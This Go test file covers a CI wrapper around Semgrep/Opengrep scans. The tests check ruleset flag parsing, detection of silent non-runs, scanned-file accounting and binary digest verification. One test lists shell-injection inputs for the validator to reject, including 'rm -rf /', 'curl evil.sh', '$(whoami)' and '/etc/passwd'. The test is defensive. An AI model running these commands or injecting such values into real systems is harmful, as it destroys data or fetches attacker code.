package main

import (
	"strings"
	"testing"
)

// TestSemgrepConfigFlagsRejectsAuto is the regression guard for the worst of the
// silent false passes: the module's own default was "auto", Semgrep OSS refused
// --config auto while --metrics=off was set, and the old command turned that
// exit-2 failure into an empty SARIF. Opengrep 2.0.0 exits 7 on it with zero
// rules loaded, and a working "auto" would be a rule set the registry picks at
// scan time, which the evidence cannot name.
func TestSemgrepConfigFlagsRejectsAuto(t *testing.T) {
	for _, in := range []string{"auto", " auto ", "p/security-audit,auto"} {
		got, err := semgrepConfigFlags(in)
		if err == nil {
			t.Fatalf("semgrepConfigFlags(%q) = %v, want an error — auto scans nothing", in, got)
		}
		if !strings.Contains(err.Error(), "neither name nor reproduce") {
			t.Errorf("error for %q should explain why a registry-chosen rule set is refused, got: %v", in, err)
		}
	}
}

func TestSemgrepConfigFlagsRejectsEmpty(t *testing.T) {
	for _, in := range []string{"", "   ", ",", " , , "} {
		if got, err := semgrepConfigFlags(in); err == nil {
			t.Errorf("semgrepConfigFlags(%q) = %v, want an error — no rules means zero findings", in, got)
		}
	}
}

func TestSemgrepConfigFlagsAccepted(t *testing.T) {
	cases := map[string][]string{
		"p/security-audit":                   {"--config", "p/security-audit"},
		"p/security-audit,p/owasp-top-ten":   {"--config", "p/security-audit", "--config", "p/owasp-top-ten"},
		" p/secrets , r/csharp.lang ":        {"--config", "p/secrets", "--config", "r/csharp.lang"},
		"./semgrep.yml":                      {"--config", "./semgrep.yml"},
		"config/rules.yaml,p/security-audit": {"--config", "config/rules.yaml", "--config", "p/security-audit"},
	}
	for in, want := range cases {
		got, err := semgrepConfigFlags(in)
		if err != nil {
			t.Errorf("semgrepConfigFlags(%q) errored: %v", in, err)
			continue
		}
		if strings.Join(got, " ") != strings.Join(want, " ") {
			t.Errorf("semgrepConfigFlags(%q) = %v, want %v", in, got, want)
		}
	}
}

// TestSemgrepConfigFlagsRejectsShellSyntax proves a consumer-supplied ruleset
// cannot carry shell metacharacters into the scan step. The values are also
// passed as positional arguments rather than spliced into the script, so this is
// the second of two independent barriers.
func TestSemgrepConfigFlagsRejectsShellSyntax(t *testing.T) {
	for _, in := range []string{
		"p/x; rm -rf /",
		"p/x && curl evil.sh",
		"$(whoami)",
		"`id`",
		"p/x|tee",
		"p/x\nnewline",
		"/etc/passwd",
	} {
		if got, err := semgrepConfigFlags(in); err == nil {
			t.Errorf("semgrepConfigFlags(%q) = %v, want rejection", in, got)
		}
	}
}

// TestSemgrepRunErrorSurfacesNonRuns covers every way semgrep can fail to scan.
// Each of these previously produced `{"runs":[]}` and a green gate.
func TestSemgrepRunErrorSurfacesNonRuns(t *testing.T) {
	oneRun := `{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"Semgrep OSS","rules":[]}},"results":[]}]}`

	cases := []struct {
		name     string
		exit     string
		stderr   string
		report   string
		wantErr  bool
		contains string
	}{
		{
			name:    "clean scan with no findings",
			exit:    "0",
			report:  oneRun,
			wantErr: false,
		},
		{
			name:    "findings found",
			exit:    "1",
			report:  `{"runs":[{"results":[{"ruleId":"x"}]}]}`,
			wantErr: false,
		},
		{
			// The exact failure the old default produced.
			name:     "auto config refused with metrics off",
			exit:     "2",
			stderr:   "[00.11][ERROR]: Cannot create auto config when metrics are off. Please allow metrics or run with a specific config.",
			wantErr:  true,
			contains: "Cannot create auto config",
		},
		{
			name:     "internal error",
			exit:     "3",
			stderr:   "Semgrep encountered an internal error",
			wantErr:  true,
			contains: "exit 3",
		},
		{
			name:     "all rules failed to load",
			exit:     "7",
			stderr:   "invalid rule schema",
			wantErr:  true,
			contains: "exit 7",
		},
		{
			name:    "exit zero but no report written",
			exit:    "0",
			report:  "  \n",
			wantErr: true,
		},
		{
			// The shape the old `|| echo` fallback fabricated. Exit status alone
			// would call this a clean scan.
			name:     "exit zero with the fabricated empty document",
			exit:     "0",
			report:   `{"version":"2.1.0","runs":[]}`,
			wantErr:  true,
			contains: "no scan runs",
		},
		{
			name:     "report is not SARIF",
			exit:     "0",
			report:   "<html>gateway timeout</html>",
			wantErr:  true,
			contains: "not valid SARIF",
		},
		{
			name:    "unreadable exit status",
			exit:    "killed",
			report:  oneRun,
			wantErr: true,
		},
		{
			name:     "trailing newline on exit code is tolerated",
			exit:     "2\n",
			stderr:   "boom",
			wantErr:  true,
			contains: "exit 2",
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := semgrepRunError(c.exit, c.stderr, c.report)
			if c.wantErr && got == "" {
				t.Fatal("expected an error string — a non-scan would pass the gate silently")
			}
			if !c.wantErr && got != "" {
				t.Fatalf("expected no error, got %q", got)
			}
			if c.contains != "" && !strings.Contains(got, c.contains) {
				t.Fatalf("error %q does not mention %q", got, c.contains)
			}
		})
	}
}

func TestSemgrepLastNonEmptyLine(t *testing.T) {
	cases := map[string]string{
		"a\nb\nc":    "c",
		"a\nb\n\n\n": "b",
		"  only  ":   "only",
		"":           "",
		"\n\n":       "",
	}
	for in, want := range cases {
		if got := lastNonEmptyLine(in); got != want {
			t.Errorf("lastNonEmptyLine(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestDefaultSastRulesetsIsNotAuto pins the default against a well-meaning
// revert: restoring "auto" would make every default scan fail at the config
// check, which is loud, but the point is that it must never be the default again.
func TestDefaultSastRulesetsIsNotAuto(t *testing.T) {
	if defaultSastRulesets == "auto" || defaultSastRulesets == "" {
		t.Fatalf("defaultSastRulesets = %q — must name explicit packs", defaultSastRulesets)
	}
	if _, err := semgrepConfigFlags(defaultSastRulesets); err != nil {
		t.Fatalf("the default must be usable: %v", err)
	}
}

// TestSemgrepExaminedTellsZeroFromSilence is the distinction the whole change
// exists for. A scan that examined nothing is an alarm — a misconfigured
// include filter, a ruleset matching no language present — and a read that
// failed is a reporting gap. A bare int would render both as "0 files".
func TestSemgrepExaminedTellsZeroFromSilence(t *testing.T) {
	cases := []struct {
		name    string
		scanned string
		want    *Examined
	}{
		{"a real count", "1204\n", &Examined{Count: 1204, Unit: "files"}},
		{"no leading zeros trouble", "007", &Examined{Count: 7, Unit: "files"}},
		{"examined nothing is a number, not a silence", "0\n", &Examined{Count: 0, Unit: "files"}},
		{"the file was never written", "", nil},
		{"whitespace only", "  \n\t ", nil},
		{"python printed None", "None\n", nil},
		{"a traceback landed in the file", "Traceback (most recent call last):\n", nil},
		{"a negative count is not a count", "-3", nil},
		{"a float is not a file count", "12.5", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := semgrepExamined(tc.scanned)
			switch {
			case tc.want == nil && got != nil:
				t.Fatalf("got %+v, want nil (an unreadable count must not state one)", got)
			case tc.want != nil && got == nil:
				t.Fatalf("got nil, want %+v", tc.want)
			case tc.want != nil && *got != *tc.want:
				t.Fatalf("got %+v, want %+v", *got, *tc.want)
			}
		})
	}
}

// TestTheSemgrepScriptAsksForTheAccounting pins the two flags the count
// depends on. --sarif-output and --json-output emit both formats from one
// scan; dropping either silently returns the module to a denominator it
// cannot state, with every test above still passing.
func TestTheSemgrepScriptAsksForTheAccounting(t *testing.T) {
	for _, want := range []string{
		"--sarif-output=/tmp/report.sarif",
		"--json-output=/tmp/report.json",
		"/tmp/semgrep.scanned",
	} {
		if !strings.Contains(semgrepScript, want) {
			t.Errorf("semgrepScript no longer contains %q", want)
		}
	}
}

// TestTheScanRunsOpengrepWithoutSemgrepOnlyFlags. Opengrep exits 2 on
// --metrics and --disable-version-check rather than ignoring them, so carrying
// either over from the Semgrep command line would turn every scan into a
// non-run. Pinned on the executable command, not on a comment.
func TestTheScanRunsOpengrepWithoutSemgrepOnlyFlags(t *testing.T) {
	line := ""
	for _, l := range strings.Split(semgrepScript, "\n") {
		if strings.HasPrefix(l, opengrepBinPath+" scan ") {
			line = l
		}
		// The verified file is the one that must run: a PATH lookup could
		// resolve to any other opengrep the image happens to carry.
		if strings.HasPrefix(strings.TrimSpace(l), "opengrep ") {
			t.Errorf("the script runs opengrep by PATH lookup, not the verified %s: %s", opengrepBinPath, l)
		}
	}
	if line == "" {
		t.Fatalf("semgrepScript no longer runs %s scan:\n%s", opengrepBinPath, semgrepScript)
	}
	for _, refused := range []string{"--metrics", "--disable-version-check"} {
		if strings.Contains(line, refused) {
			t.Errorf("the scan command carries %s, which opengrep rejects: %s", refused, line)
		}
	}
	if strings.Contains(semgrepScript, "\nsemgrep ") {
		t.Error("semgrepScript still invokes a semgrep binary the scan image does not have")
	}
}

// TestTheBinaryIsVerifiedBeforeAnythingRuns. The digest check must come
// before the scan and before any helper, so no code from an unverified binary
// ever executes, and a mismatch must stop the script with a non-run exit.
func TestTheBinaryIsVerifiedBeforeAnythingRuns(t *testing.T) {
	verify := strings.Index(semgrepScript, "cicd_check "+opengrepBinPath)
	scan := strings.Index(semgrepScript, opengrepBinPath+" scan ")
	helper := strings.Index(semgrepScript, "python3 ")
	if verify < 0 || scan < 0 || helper < 0 {
		t.Fatalf("script lost a step:\n%s", semgrepScript)
	}
	if verify > scan || verify > helper {
		t.Error("the binary is checked after something already ran")
	}
	if !strings.Contains(semgrepScript, opengrepSHA256Env) {
		t.Error("the script no longer compares against the pinned digest")
	}
}

// TestTheScannedFileIsTruncatedBeforeTheScan. The count file is created empty
// up front, so a semgrep that dies before writing anything leaves "did not
// state" rather than a stale count from an earlier layer.
func TestTheScannedFileIsTruncatedBeforeTheScan(t *testing.T) {
	truncate := strings.Index(semgrepScript, ": > /tmp/semgrep.scanned")
	scan := strings.Index(semgrepScript, "opengrep scan ")
	if truncate < 0 || scan < 0 {
		t.Fatalf("script no longer has both steps:\n%s", semgrepScript)
	}
	if truncate > scan {
		t.Error("the count file is truncated after the scan, so a dead scan can report a stale count")
	}
}

// TestTheInlineHelperRunsTheVerifiedBinary. semgrep_inline.py starts its own
// opengrep, so it must name the same absolute path opengrepVerifyScript
// checked; a PATH lookup there would run an unverified engine on the inline
// scripts while the ordinary pass ran the verified one.
func TestTheInlineHelperRunsTheVerifiedBinary(t *testing.T) {
	want := `ENGINE = "` + opengrepBinPath + `"`
	if !strings.Contains(semgrepInlineScript, want) {
		t.Fatalf("semgrep_inline.py no longer pins %s", want)
	}
}
